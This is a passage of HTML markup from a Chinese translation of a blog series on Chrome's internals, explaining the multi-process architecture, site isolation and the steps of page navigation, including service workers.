data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2020/svg/164572/1599615773729-459bc3e3-9d03-4af9-a5d0-5a11276a034f.svg#height=470&id=caSEM&originHeight=150&originWidth=273&originalType=binary&ratio=1&rotation=0&showTitle=false&size=293505&status=done&style=none&title=&width=855" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif" alt="2.svg"></p><p>图 6：独立进程通过 IPC 通信示意图</p><p><a name="c4f5cabc"></a></p><h2 id="浏览器架构"><a href="#浏览器架构" class="headerlink" title="浏览器架构"></a>浏览器架构</h2><p>那么如何通过进程和线程构建 web 浏览器呢？它可能由一个拥有很多线程的进程，或是一些通过 IPC 通信的不同线程的进程。</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2020/png/164572/1599615781904-137d5260-8f05-4773-9a44-1e650ac38709.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2020/png/164572/1599615781904-137d5260-8f05-4773-9a44-1e650ac38709.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif" alt="image.png"></p><p>图 7：不同浏览器架构的进程&#x2F;线程示意图</p><p>这里需要注意的重要一点是，这些不同的架构是实现细节。关于如何构建 web 浏览器并不存在标准规范。一个浏览器的构建方法可能与另一个迥然不同。</p><p>在本博客系列中，我们使用下图所示的 Chrome 近期架构进行阐述。</p><p>顶部是浏览器进程，它与处理应用其它模块任务的进程进行协调。对于渲染进程来说，创建了多个渲染进程并分配给了每个标签页。直到最近，Chrome 在可能的情况下给每个标签页分配一个进程。而现在它试图给每个站点分配一个进程，包括 iframe（参见<a href="#%E6%AF%8F%E4%B8%AA-iframe-%E7%9A%84%E6%B8%B2%E6%9F%93%E8%BF%9B%E7%A8%8B--%E7%AB%99%E7%82%B9%E9%9A%94%E7%A6%BB">站点隔离</a>）。</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2020/png/164572/1599615789037-3b5c5445-dc91-4673-bbbd-55d5f618fc0c.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2020/png/164572/1599615789037-3b5c5445-dc91-4673-bbbd-55d5f618fc0c.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif" alt="image.png"></p><p>图 8：Chrome 的多进程架构示意图。渲染进程下显示了多个层，表明 Chrome 为每个标签页运行多个渲染进程。</p><p><a name="51b19fbc"></a></p><h2 id="进程各自控制什么？"><a href="#进程各自控制什么？" class="headerlink" title="进程各自控制什么？"></a>进程各自控制什么？</h2><p>下表展示每个 Chrome 进程与各自控制的内容：</p><table><thead><tr><th>进程</th><th>控制</th></tr></thead><tbody><tr><td>浏览器</td><td>控制应用中的 “Chrome” 部分，包括地址栏，书签，回退与前进按钮。以及处理 web 浏览器不可见的特权部分，如网络请求与文件访问。</td></tr><tr><td>渲染</td><td>控制标签页内网站展示。</td></tr><tr><td>插件</td><td>控制站点使用的任意插件，如 Flash。</td></tr><tr><td>GPU</td><td>处理独立于其它进程的 GPU 任务。GPU 被分成不同进程，因为 GPU 处理来自多个不同应用的请求并绘制在相同表面。</td></tr></tbody></table><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2020/png/164572/1599615796495-74e3b320-3435-410e-af32-f60c66a1b8d2.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2020/png/164572/1599615796495-74e3b320-3435-410e-af32-f60c66a1b8d2.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif" alt="image.png"></p><p>图 9：不同进程指向浏览器 UI 的不同部分</p><p>还有更多进程如扩展进程与应用进程。如果你想要了解有多少进程运行在你的 Chrome 浏览器中，可以点击右上角的选项菜单图标，选择更多工具，然后选择任务管理器。然后会打开一个窗口，其中列出了当前正在运行的进程以及它们当前的 CPU&#x2F;内存使用量。</p><p><a name="66ec77ef"></a></p><h2 id="Chrome-多进程架构的优点"><a href="#Chrome-多进程架构的优点" class="headerlink" title="Chrome 多进程架构的优点"></a>Chrome 多进程架构的优点</h2><p>前文中提到了 Chrome 使用多个渲染进程。最简单的情况下，你可以想象每个标签页都有自己的渲染进程。假设你打开了三个标签页，每个标签页都拥有自己独立的渲染进程。如果某个标签页失去响应，你可以关掉这个标签页，此时其它标签页依然运行着，可以正常使用。如果所有标签页都运行在同一进程上，那么当某个失去响应，所有标签页都会失去响应。这样的体验很糟糕。</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2020/svg/164572/1599615825071-23986c0a-3ff0-424c-b4b4-d198b010ea9f.svg#height=572&id=jj7Fj&originHeight=150&originWidth=273&originalType=binary&ratio=1&rotation=0&showTitle=false&size=112568&status=done&style=none&title=&width=1041" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2020/svg/164572/1599615825071-23986c0a-3ff0-424c-b4b4-d198b010ea9f.svg#height=572&id=jj7Fj&originHeight=150&originWidth=273&originalType=binary&ratio=1&rotation=0&showTitle=false&size=112568&status=done&style=none&title=&width=1041" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif" alt="3.svg"></p><p>图 10：如图所示每个标签页上运行的渲染进程</p><p>把浏览器工作分成多个进程的另一好处是安全性与沙箱化。由于操作系统提供了限制进程权限的方法，浏览器就可以用沙箱保护某些特定功能的进程。例如，Chrome 浏览器限制处理任意用户输入的进程(如渲染器进程)对任意文件的访问。</p><p>由于进程有自己的私有内存空间，所以它们通常包含公共基础设施的拷贝(如 V8，它是 Chrome 的 JavaScript 引擎)。这意味着使用了更多的内存，如果它们是同一进程中的线程，就无法共享这些拷贝。为了节省内存，Chrome 对可加速的内存数量进行了限制。具体限制数值依设备可提供的内存与 CPU 能力而定，但是当 Chrome 运行时达到限制时，会开始在同一站点的不同标签页上运行同一进程。</p><p><a name="f48608af"></a></p><h2 id="节省更多内存-——-Chrome-中的服务化"><a href="#节省更多内存-——-Chrome-中的服务化" class="headerlink" title="节省更多内存 —— Chrome 中的服务化"></a>节省更多内存 —— Chrome 中的服务化</h2><p>同样的方法也适用于浏览器进程。Chrome 正在经历架构变革，它转变为将浏览器程序的每一模块作为一个服务来运行，从而可以轻松实现进程的拆解或聚合。</p><p>通常观点是当 Chrome 运行在强力硬件上时，它会将每个服务分解到不同进程中，从而提升稳定性，但是如果 Chrome 运行在资源有限的设备上时，它会将服务聚合到一个进程中从而节省了内存占用。在这一架构变革实现前，类似的整合进程以减少内存使用的方法已经在 Android 类平台上使用。</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2020/svg/164572/1599615881070-8a96f98c-ee7c-4809-b631-c6000a1f2efb.svg#height=547&id=U2F2c&originHeight=150&originWidth=273&originalType=binary&ratio=1&rotation=0&showTitle=false&size=335942&status=done&style=none&title=&width=995" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2020/svg/164572/1599615881070-8a96f98c-ee7c-4809-b631-c6000a1f2efb.svg#height=547&id=U2F2c&originHeight=150&originWidth=273&originalType=binary&ratio=1&rotation=0&showTitle=false&size=335942&status=done&style=none&title=&width=995" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif" alt="4.svg"></p><p>图 11： Chrome 的服务化图，将不同的服务移动到多个进程和单个浏览器进程中</p><p><a name="a6731ad1"></a></p><h2 id="每个-iframe-的渲染进程-——-站点隔离"><a href="#每个-iframe-的渲染进程-——-站点隔离" class="headerlink" title="每个 iframe 的渲染进程 —— 站点隔离"></a>每个 iframe 的渲染进程 —— 站点隔离</h2><p><a href="https://developers.google.com/web/updates/2018/07/site-isolation">站点隔离</a> 是近期引入到 Chrome 中的一个功能，它为每个 iframe 运行一个单独的渲染进程。我们已经讨论了许久每个标签页的渲染进程，它允许跨站点 iframe 运行在一个单独的渲染进程，在不同站点中共享内存。运行 a.com 与 b.com 在同一渲染进程中看起来还 ok。</p><p><a href="https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy">同源策略</a> 是 web 的核心安全模型。同源策略确保站点在未得到其它站点许可的情况下不能获取其数据。安全攻击的一个主要目标就是绕过同源策略。进程隔离是分离站点的最高效的手段。随着 <a href="https://developers.google.com/web/updates/2018/02/meltdown-spectre">Meltdown and Spectre</a> 的出现，使用进程来分离站点愈发势在必行。Chrome 67 版本后，桌面版 Chrome 都默认开启了站点隔离，每个标签页的 iframe 都有一个单独的渲染进程。</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2020/png/164572/1599615869857-83aa8ae0-9caa-4c58-b746-5e6ead89bfe3.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2020/png/164572/1599615869857-83aa8ae0-9caa-4c58-b746-5e6ead89bfe3.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif" alt="image.png"></p><p>图 12：站点隔离示意图，多个渲染进程指向站点内的 iframe</p><p>启用站点隔离是多年来工程人员努力的结果。站点隔离并不只是分配不同的渲染进程这么简单。它从根本上改变了 iframe 的通信方式。在一个页面上打开开发者工具，让 iframe 在不同的进程上运行，这意味着开发者工具必须在幕后工作，以使它看起来无缝。即使运行一个简单的 Ctrl + F 来查找页面中的一个单词，也意味着在不同的渲染器进程中进行搜索。你可以看到为什么浏览器工程师把发布站点隔离功能作为一个重要里程碑！</p><p><a name="25f9c7fa"></a></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这一部分从高级视角对浏览器架构与多进程架构的优点进行阐述。我们也对 Chrome 中与多进程架构密切相关的服务化与站点隔离进行了讲解。下一部分中，我们将开始深入了解进程与线程中到底发生了什么才能使网站得以呈现。</p><p><a name="QWTre"></a></p><h1 id="第二部分"><a href="#第二部分" class="headerlink" title="第二部分"></a>第二部分</h1><p>在这一部分中，我们研究了导航过程中发生了什么，以及你的 Web 应用代码（例如响应头和客户端 JavaScript）如何与浏览器交互。了解浏览器通过网络获取数据的步骤，可以更容易地理解为什么开发导航预加载等 API。<br><a name="8ab505b2"></a></p><h2 id="导航时发生了什么"><a href="#导航时发生了什么" class="headerlink" title="导航时发生了什么"></a>导航时发生了什么</h2><p>这是关于 Chrome 内部工作的 4 篇博客系列的第 2 篇。在<a href="https://github.com/xitu/gold-miner/blob/master/TODO1/inside-look-at-modern-web-browser-part1.md">上一篇文章</a>中，我们研究了不同的进程和线程如何处理浏览器的不同部分。在这篇文章中，我们会更深入研究每个进程和线程如何进行通信以展示网站。</p><p>让我们看一个网络浏览的简单用例：你在浏览器中键入 URL，然后浏览器从互联网获取数据并显示一个页面。在这篇文章中，我们将重点放在用户请求站点和浏览器准备渲染页面部分 —— 亦即导航。</p><p><a name="411db4a0"></a></p><h2 id="它以浏览器进程开始"><a href="#它以浏览器进程开始" class="headerlink" title="它以浏览器进程开始"></a>它以浏览器进程开始</h2><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2020/png/164572/1599616629080-71613c80-dc9d-4060-ab0c-4881b94a2d82.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2020/png/164572/1599616629080-71613c80-dc9d-4060-ab0c-4881b94a2d82.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif" alt="image.png"></p><p>图 1：顶部是浏览器 UI，底部是拥有 UI、网络和存储线程的浏览器进程图</p><p>正如我们在<a href="https://developers.google.com/web/updates/2018/09/inside-browser-part1">第 1 部分：CPU、GPU、内存和多进程架构</a>中所述，tab 外的一切都被浏览器进程处理。浏览器进程有很多线程，例如绘制浏览器按钮和输入栏的 UI 线程、处理网络栈以从因特网获取数据的网络线程、控制文件访问的存储线程等。当你在地址栏中键入 URL 时，你的输入将由浏览器进程的 UI 线程处理。</p><p><a name="ed797f7d"></a></p><h2 id="一个简单导航"><a href="#一个简单导航" class="headerlink" title="一个简单导航"></a>一个简单导航</h2><p><a name="a58a4caa"></a></p><h3 id="第-1-步：处理输入"><a href="#第-1-步：处理输入" class="headerlink" title="第 1 步：处理输入"></a>第 1 步：处理输入</h3><p>当用户开始在地址栏键入时，UI 线程要问的第一件事是 “这是一次搜索查询还是一个 URL 地址？”。在 Chrome 中，地址栏同时也是一个搜索输入栏，所以 UI 线程需要解析和决定把你的请求发送到搜索引擎，或是你要请求的网站。</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2020/png/164572/1599616639583-201e787d-6b70-475c-ad10-f1c89fcbef26.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2020/png/164572/1599616639583-201e787d-6b70-475c-ad10-f1c89fcbef26.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif" alt="image.png"></p><p>图 1：UI 线程询问输入内容是搜索查询还是 URL 地址</p><p><a name="b6e4ae45"></a></p><h3 id="第-2-步：开始导航"><a href="#第-2-步：开始导航" class="headerlink" title="第 2 步：开始导航"></a>第 2 步：开始导航</h3><p>当用户按下 Enter 键时，UI 线程启用网络调取去获取站点内容。加载动画会显示在标签页的一角，网络线程会通过适当的协议，像 DNS 查找和为请求建立 TLS 连接。</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2020/png/164572/1599616647692-f5f7ac6a-56da-4c97-a0be-0037caaee21a.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2020/png/164572/1599616647692-f5f7ac6a-56da-4c97-a0be-0037caaee21a.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif" alt="image.png"></p><p>图 2：UI 线程告诉网络线程要导航到 mysite.com</p><p>在这时，网络线程可能会收到像 HTTP 301 那样的服务器重定向头。这种情况下，网络线程会告诉 UI 线程，服务器正在请求重定向。然后，另一个 URL 请求会被启动。</p><p><a name="3d24bd80"></a></p><h3 id="第-3-步：读取响应"><a href="#第-3-步：读取响应" class="headerlink" title="第 3 步：读取响应"></a>第 3 步：读取响应</h3><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2020/png/164572/1599616655237-2b7498c1-ada4-4ce9-a5a6-bc15d0a23d78.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2020/png/164572/1599616655237-2b7498c1-ada4-4ce9-a5a6-bc15d0a23d78.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif" alt="image.png"></p><p>图 3：包含 Content-Type 的响应头以及作为实际数据的 payload</p><p>一旦开始收到响应主体（payload），网络线程会在必要时查看数据流的前几个字节。响应报文的 Content-Type 字段会声明数据的类型，但是它有可能会丢失或者错误，所以就有了 <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Basics_of_HTTP/MIME_types">MIME 类型嗅探</a>来解决这个问题。这是<a href="https://cs.chromium.org/chromium/src/net/base/mime_sniffer.cc?sq=package:chromium&dr=CS&l=5">源码</a>中评论的“棘手的问题”。你可以阅读注释看一下不同浏览器是怎么匹配 content-type 和 payload 的。</p><p>如果响应是一个 HTML 文件，那么下一步就会把数据传给渲染进程，但是如果是一个压缩文件或是其他文件，那么意味着它是一个下载请求，因此需要将数据传递给下载管理器。</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2020/png/164572/1599616663436-4894518e-5d3a-4188-aa23-500219fbf360.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2020/png/164572/1599616663436-4894518e-5d3a-4188-aa23-500219fbf360.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif" alt="image.png"></p><p>图 4：网络线程询问一个响应数据是否是从安全网站来的 HTML</p><p>此时也会进行 <a href="https://safebrowsing.google.com/">SafeBrowsing</a> 检查。如果域名和响应数据似乎匹配到一个已知的恶意网站，那么网络线程会显示一个警告页面。除此之外，还会发生 <a href="https://www.chromium.org/Home/chromium-security/corb-for-developers"><strong>C</strong>ross <strong>O</strong>rigin <strong>R</strong>ead <strong>B</strong>locking（<strong>CORB</strong>）</a>检查，以确保敏感的跨域数据不被传给渲染进程。</p><p><a name="173d1c10"></a></p><h3 id="第-4-步：查找渲染进程"><a href="#第-4-步：查找渲染进程" class="headerlink" title="第 4 步：查找渲染进程"></a>第 4 步：查找渲染进程</h3><p>一旦所有的检查执行完毕并且网络线程确信浏览器会导航到请求的站点，网络线程会告诉 UI 线程所有的数据准备完毕。UI 线程会寻找渲染进程去开始渲染 web 页面。</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2020/png/164572/1599616671566-4f5fb6f4-6e70-49d8-815e-123eba318282.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2020/png/164572/1599616671566-4f5fb6f4-6e70-49d8-815e-123eba318282.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif" alt="image.png"></p><p>图 5：网络线程告诉 UI 线程去查找渲染进程</p><p>由于网络请求会花费几百毫秒才获取回响应，因此可以应用一个优化措施。当第 2 步 UI 线程正发送一个 URL 请求给网络线程时，它已经知道它们会导航到哪个站点。在网络请求的同时，UI 并行地线程尝试主动寻找或开启一个渲染进程。这样，如果一切按预期进行，渲染进程在网络线程接受到数据时就已经处于待命状态。如果导航跨域重定向，这个待命进程也许不会被用到，这种情况下也许会用到另一个进程。</p><p><a name="100537ff"></a></p><h3 id="第-5-步：提交导航"><a href="#第-5-步：提交导航" class="headerlink" title="第 5 步：提交导航"></a>第 5 步：提交导航</h3><p>现在数据和渲染进程已经就绪，浏览器进程会发送一个 IPC（进程间通信）到渲染进程去提交导航。它也会传递数据流，所以渲染进程可以保持接收 HTML 数据。一旦浏览器进程收到渲染进程已经提交的确认消息，导航完毕并且文档加载解析开始。</p><p>这时，地址栏已经更新，安全指示器和站点设置 UI 会反映新页面的站点信息。此标签页的 session 历史记录会被更新，所以前进&#x2F;后退按钮会走向刚导航过的站点。当你关闭标签页或者窗口，为了优化 tab&#x2F;session 的还原，session 历史被保存在硬盘上。</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2020/png/164572/1599616678923-54b99257-537d-4270-a328-80990815d56a.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2020/png/164572/1599616678923-54b99257-537d-4270-a328-80990815d56a.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif" alt="image.png"></p><p>图 6：浏览器和渲染进程间的 IPC，请求渲染页面。</p><p><a name="7803eae1"></a></p><h3 id="额外的步骤：初始加载完毕"><a href="#额外的步骤：初始加载完毕" class="headerlink" title="额外的步骤：初始加载完毕"></a>额外的步骤：初始加载完毕</h3><p>一旦导航被提交，渲染进程开始加载资源和渲染页面。我们将在下一篇文章中讲解这个阶段发生什么的细节。一旦渲染进程渲染“完毕”。它会发送一个 IPC 返回给浏览器进程（这会在页面所有的 frame 的 <code>onload</code> 事件已经触发和执行完毕后发生）。这时，UI 线程停止标签页上的加载动画。</p><p>我之所以说“结束”，是因为客户端 JavaScript 可以在这时之后仍然加载额外的资源并且渲染新视图。</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2020/png/164572/1599616687543-a2d03be1-4e28-4723-9d7c-6872a3f1b2db.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2020/png/164572/1599616687543-a2d03be1-4e28-4723-9d7c-6872a3f1b2db.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif" alt="image.png"></p><p>图 7：渲染进程发送 IPC 到浏览器进程通知页面“已被加载”</p><p><a name="36edc000"></a></p><h2 id="导航到另一个站点"><a href="#导航到另一个站点" class="headerlink" title="导航到另一个站点"></a>导航到另一个站点</h2><p>简单导航已经完毕！但是用户在地址栏输入另一个 URL 会怎样呢？好吧，浏览器进程会执行相同的步骤来导航到一个不同的站点。但是在它做这个之前，它会检查当前已经渲染的站点是否关心 <code>[beforeunload](https://developer.mozilla.org/en-US/docs/Web/Events/beforeunload)</code> 事件。</p><p><code>beforeunload</code> 可以在你试图导航离开或关闭标签页时创建“离开此站点？”警告。包括你的 JavaScript 代码，所有标签页内的东西都是由渲染进程处理，所以当新的导航请求到来时，浏览器进程必须要跟当前的渲染进程核对。</p><p><strong>注意：</strong> 不要添加无条件的 <code>beforeunload</code> 处理程序。它会产生更多延迟，因为处理程序需要在导航开始之前执行。应仅在需要时添加此事件处理程序，例如如果需要警告用户他们可能会丢失他们在页面上输入的数据。</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2020/png/164572/1599616695201-b12476a2-7646-4e29-8767-12181fee08bb.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2020/png/164572/1599616695201-b12476a2-7646-4e29-8767-12181fee08bb.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif" alt="image.png"></p><p>图 8：浏览器进程向渲染进程发送 IPC 告诉它将要导航到另一个站点</p><p>如果渲染进程已经启动了导航（像用户点击一个链接或者客户端 JavaScript 运行 <code>window.location = &quot;https://newsite.com&quot;</code>），渲染进程会先检查 <code>beforeunload</code> 事件处理程序。然后，它会像浏览器处理启动导航一样执行相同的步骤。唯一不同的是导航请求是由渲染进程发送到浏览器进程的。</p><p>当新导航到的站点不同于当前已渲染的站点时，会调用一个独立的渲染进程来处理新导航，同时保持当前的渲染进程来处理类似 <code>unload</code> 的事件。有关更多信息，请查看<a href="https://developers.google.com/web/updates/2018/07/page-lifecycle-api#overview_of_page_lifecycle_states_and_events">页面生命周期概览</a>以及如何使用<a href="https://developers.google.com/web/updates/2018/07/page-lifecycle-api">页面生命周期 API</a> 挂钩事件。</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2020/png/164572/1599616702471-aa906884-5366-4bd6-b6ab-dd048ad7cb2e.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2020/png/164572/1599616702471-aa906884-5366-4bd6-b6ab-dd048ad7cb2e.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif" alt="image.png"></p><p>图 9：2 个 IPC（从浏览器进程到新渲染进程）告知渲染页面并告知旧渲染进程卸载</p><p><a name="029568fa"></a></p><h2 id="如果有-Service-Worker"><a href="#如果有-Service-Worker" class="headerlink" title="如果有 Service Worker"></a>如果有 Service Worker</h2><p>最近对导航过程的改变是引入了 <a href="https://developers.google.com/web/fundamentals/primers/service-workers/">service worker</a>。service worker 是一种在你的应用代码中编写网络代理的方法；允许 Web 开发者更好地控制本地缓存内容以及何时从网络获取新数据。如果将 service worker 设置为从缓存加载页面，则无需从网络请求数据。</p><p>要记住的重要部分是 Service Worker 是在渲染进程中运行的 JavaScript 代码。但是当导航请求进入时，浏览器进程如何知道该站点有 service worker？</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2020/png/164572/1599616710231-89d5d6a3-5827-4717-8076-71367fde731b.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2020/png/164572/1599616710231-89d5d6a3-5827-4717-8076-71367fde731b.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif" alt="image.png"></p><p>图 10：浏览器进程中的网络线程查找 service worker 作用域</p><p>当注册一个 service worker 时，保持 service worker 的作用域作为一个引用（你可以在这篇文章 <a href="https://developers.google.com/web/fundamentals/primers/service-workers/lifecycle">The Service Worker Lifecycle</a> 中阅读更多关于作用域的知识）。当一个导航发生时，网络线程用已注册的 service worker 作用域来检查域名，如果已经为该 URL 注册了一个 service worker，UI 线程会找一个渲染线程来执行 service worker 的代码。service worker 可能从缓存中加载数据，无需从网络请求数据，或者可以从网络请求新资源。</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2020/png/164572/1599616718334-55df6bb4-02d3-4095-8f23-e85d12575e97.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2020/png/164572/1599616718334-55df6bb4-02d3-4095-8f23-e85d12575e97.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif" alt="image.png"></p><p>图 11：浏览器中的 UI 线程启动渲染进程来处理 service workers；然后，渲染进程中的工作线程从网络请求数据</p><p><a name="8f24f2b0"></a></p><h2 id="导航预加载"><a href="#导航预加载" class="headerlink" title="导航预加载"></a>导航预加载</h2><p>你可以看到，如果 service worker 最终决定从网络请求数据，则浏览器进程和渲染器进程之间的往返可能会导致延迟。<a href="https://developers.google.com/web/updates/2017/02/navigation-preload">导航预加载</a>是一种通过与 service worker 启动并行加载资源来加速此过程的机制。它用一个头部来标记这些请求，允许服务器决定为这些请求发送不同的内容；例如，只更新数据而不是完整文档。</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2020/png/164572/1599616726140-177b3ee3-c297-4992-99e7-4f01fee661f0.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2020/png/164572/1599616726140-177b3ee3-c297-4992-99e7-4f01fee661f0.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif" alt="image.png"></p><p>图 12：浏览器进程中的 UI 线程启动渲染进程以在并行启动网络请求的同时处理 service worker</p><p><a name="sZRMf"></a></p><h2 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h2><p>在这一部分中，我们研究了导航过程中发生了什么，以及你的 Web 应用代码（例如响应头和客户端 JavaScript）如何与浏览器交互。了解浏览器通过网络获取数据的步骤，可以更容易地理解为什么开发导航预加载等 API。在下一部分，我们将深入探讨浏览器如何分析 HTML&#x2F;CSS&#x2F;JavaScript 以渲染页面。</p><p><a name="KOvVu"></a></p><h1 id="第三部分"><a href="#第三部分" class="headerlink" 